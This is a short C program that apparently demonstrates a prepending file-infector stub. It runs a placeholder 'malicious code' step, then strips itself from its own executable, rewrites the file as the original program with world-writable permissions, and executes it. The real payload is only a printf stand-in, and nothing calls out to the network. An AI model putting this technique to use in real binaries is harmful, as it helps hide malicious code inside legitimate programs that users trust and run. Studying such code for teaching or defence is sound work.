// This program can execute malicious code before letting a normal program run.
#include<stdio.h>
#include<stdlib.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>

#define IJN_NBYTES 17464
#define PLD_NBYTES 20000

char*
read_payload_binary(char* path, ssize_t* nbytes)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "Couldn't open the payload.\n");
        exit(1);
    }

    lseek(fd, IJN_NBYTES, SEEK_SET);

    char* payload = malloc(PLD_NBYTES);
    if (payload == NULL) {
        fprintf(stderr, "Out of memory :'(.\n");
        exit(1);
    }
    *nbytes = read(fd, payload, PLD_NBYTES);
    if (*nbytes <= 0) {
        fprintf(stderr, "No payload or failed to read payload.\n");
        exit(1);
    }
    close(fd);
    return payload;
}

void
replace_with_payload(char* path, char* payload, ssize_t nbytes_payload)
{
    remove(path);

    int fd = creat(path, S_IRWXU | S_IRWXG | S_IRWXO);
    if (fd < 0) {
        fprintf(stderr, "Couldn't open file.\n");
        exit(1);
    }
    close(fd);

    fd = open(path, O_WRONLY);
    lseek(fd, 0, SEEK_SET);
    ssize_t bytes_wrote = write(fd, payload, nbytes_payload);
    if (bytes_wrote <= 0) {
        fprintf(stderr, "Failed to write the payload.\n");
        exit(1);
    }
    close(fd);
}

void
remove_injection_binary(char* path)
{
    ssize_t nbytes_payload = 0;

    char* payload = read_payload_binary(path, &nbytes_payload);

    replace_with_payload(path, payload, nbytes_payload);

    free(payload);
}

void
run_payload(char* path)
{
    char* newargv[] = { NULL };
    char* newenviron[] = { NULL };
    execve(path, newargv, newenviron);
}

int
main(int arc, char* argv[])
{
    printf("This could be some malicious code!\n");

    remove_injection_binary(argv[0]);

    run_payload(argv[0]);

    exit(1);
}
